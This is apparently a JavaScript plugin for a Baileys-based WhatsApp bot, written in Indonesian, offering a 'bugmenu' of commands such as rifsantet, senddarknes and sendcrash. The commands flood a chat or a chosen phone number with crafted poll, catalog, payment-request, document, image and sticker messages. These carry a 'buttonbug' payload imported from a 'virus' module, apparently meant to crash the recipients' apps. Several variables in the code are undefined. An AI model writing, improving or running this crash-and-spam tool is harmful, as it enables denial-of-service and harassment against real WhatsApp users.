import fetch from 'node-fetch'
import { buttonbug } from '../virus/buttonbug.js'
import pkg from '@adiwajshing/baileys'

const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = pkg

let handler = async (m, { conn, args, usedPrefix, command, participants }) => {
let nmiku = [
'https://telegra.ph/file/9dc229b17638708432b7c.jpg',
'https://telegra.ph/file/c10758adc076889d813c9.jpg'
].getRandom()

const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `𝔸𝕣𝕚𝕗𝕫𝕪𝕟𝕏𝔻 𝔻𝔼𝕍\n${buttonbug}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

if (command == 'bugpoll') {
if (args.length == 0) return m.reply(`Penggunaan ${usedPrefix+command} jumlah\nContoh ${usedPrefix+command} 5`)
const jumlah = `${encodeURI(args[0])}`
const ydd = `Hallo Aku 𝑨𝒓𝒊𝒇𝒛𝒚𝒏`
for (let i = 0; i < jumlah; i++) {
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA 𝑨𝒓𝒊𝒇𝒛𝒚𝒏",
"options": [
{
"optionName": "KATANYA WA KEBAL"
},
{
"optionName": "BERANI VOTE GA"
},
{
"optionName": "VOTE LAH SEMUA"
},
{
"optionName": "KATANYA KEBAL"
},
{
"optionName": "SALAM BROTHER BY © 𝑨𝒓𝒊𝒇𝒛𝒚𝒏"
}
],
"selectableOptionsCount": 5
}
}), { userJid: m.chat, quoted: bdoc })
conn.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
m.reply('sukses sendbug')
}

if (command == 'inibug') {
if (args.length == 0) return m.reply(`Penggunaan ${usedPrefix+command} jumlah\nContoh ${usedPrefix+command} 5`)
const jumlah = `${encodeURI(args[0])}`
const lydd = `Hallo Aku 𝑨𝒓𝒊𝒇𝒛𝒚𝒏`
for (let i = 0; i < jumlah; i++) {
let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
 ➲ *Pesan : ${args[0] ? args[0] : 'kosong'}*\n\n`
for (let mem of participants) {
coteks += `⭔ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
}

if (command == 'arifbug') {
if (!args[0]) return m.reply(`masukan no nya`)
let a = await conn.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© Nextbotz`,jpegThumbnail: miku}}}
var messa = await prepareWAMessageMedia({ image: await (await fetch(nmiku)).buffer() }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "8755293057814892",
"title": `Bug Catalog By Arifzyn`,
"description": `gaktau`,
"currencyCode": "IDR",
"bodyText": `gaktaukalo`,
"footerText": `koncol`,
"priceAmount1000": "300000000000",
"productImageCount": 100,
"firstImageId": 1,
"salePriceAmount1000": "3000000000000",
"retailerId": `PutraModz⿻ꫂ`,
"url": "wa.me/6282214729677"
},
"businessOwnerJid": "6282214729677@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: bdoc })
conn.relayMessage(args[0] + '@s.whatsapp.net', catalog.message, { messageId: catalog.key.id })
m.reply(`Sukses send bug catalog ke nomor ${args[0]}@s.whatsapp.net`)
}

if (command == 'rifsantet') {
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62xxx|1|10s\n\n\ns = Second/Detik\n\n`)
const num = args[0].split('|')[0]
const jumlah = args[0].split('|')[1]
for (let i = 0; i < jumlah; i++) {
m.reply(`Baiklah Tuan`)
var messa = await prepareWAMessageMedia({ image: await (await fetch(nmiku)).buffer() }, { upload: conn.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": 'USD',
"amount1000": '1000000000',
"requestFrom": num + '@s.whatsapp.net',
"noteMessage": {
"extendedTextMessage": {
"text": `MY DEVELOPER © PutraModz`,
}}
}}), { userJid: m.chat, quoted: bdoc })
conn.relayMessage(num + '@s.whatsapp.net', requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}

if (command == 'rifdarknes') {
if (args.length == 0) return m.reply(`Penggunaan ${usedPrefix+command} jumlah\nContoh ${usedPrefix+command} 5`)
const jumlah = `${encodeURI(args[0])}`
const ydd = `Hallo Aku 𝑨𝒓𝒊𝒇𝒛𝒚𝒏`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 © 𝑨𝒓𝒊𝒇𝒛𝒚𝒏 𝐌𝐎𝐃𝐒 ☠️\n\n.${buttonbug}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
conn.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}

if (command == 'senddarknes') {
if (args.length == 0) return m.reply(`*Syntax Error!*\n\nUse : ${usedPrefix+command} nomor target|amount spam|timer\nExample : ${command} 62xxx|1|10s\n\n\ns = Second/Detik`)
const num = args[0].split('|')[0]
const jumlah = args[0].split('|')[1]
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 © 𝑨𝒓𝒊𝒇𝒛𝒚𝒏 𝐌𝐎𝐃𝐒 ☠️\n\n.${buttonbug}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat, quoted: doc })
conn.relayMessage(num + '@s.whatsapp.net', document.message, { messageId: document.key.id })
}
m.reply(`Success Send Darkness To: ${num}\nAmount Spam: ${jumlah}`)
}

if (command == 'rifcrash') {
if (args.length == 0) return m.reply(`Penggunaan ${usedPrefix+command} jumlah\nContoh ${usedPrefix+command} 5`)
const jumlah = `${encodeURI(args[0])}`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: await (await fetch(nmiku)).buffer() }, { upload: conn.waUploadToServer })
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `© 𝔸𝕣𝕚𝕗𝕫𝕪𝕟𝕏𝔻 𝕄𝕆𝔻𝕊 𝔻𝕖𝕧\n\n${buttonbug}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
conn.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
m.reply(`Success Send Darkness To: ${num}\nAmount Spam: ${jumlah}`)
}

if (command == 'sendcrash') {
if (!args[0]) return m.reply(`*Syntax Error!*\n\nUse : ${usedPrefix+command} nomor target|amount spam|timer\nExample : ${command} 62xxx|1|10s\n\n\ns = Second/Detik`)
const num = args[0].split('|')[0]
const jumlah = args[0].split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: await (await fetch(nmiku)).buffer() }, { upload: conn.waUploadToServer })
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `© 𝔸𝕣𝕚𝕗𝕫𝕪𝕟𝕏𝔻 𝕄𝕆𝔻𝕊 𝔻𝕖𝕧\n\n${buttonbug}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
conn.relayMessage(num + '@s.whatsapp.net', image.message, { messageId: image.key.id })
}
}

if (command == 'rifstick') {
if (args.length == 0) return m.reply(`Penggunaan ${usedPrefix+command} jumlah\nContoh ${usedPrefix+command} 5`)
const jumlah = `${encodeURI(args[0])}`
for (let i = 0; i < jumlah; i++) {
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
conn.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
}

}
handler.tags = ['bugmenu']
handler.help = handler.command = ['bugpoll', 'inibug', 'arifbug', 'rifsantet', 'rifdarknes', 'senddarknes', 'rifcrash', 'sendcrash', 'rifstick']

handler.owner = true 

export default handler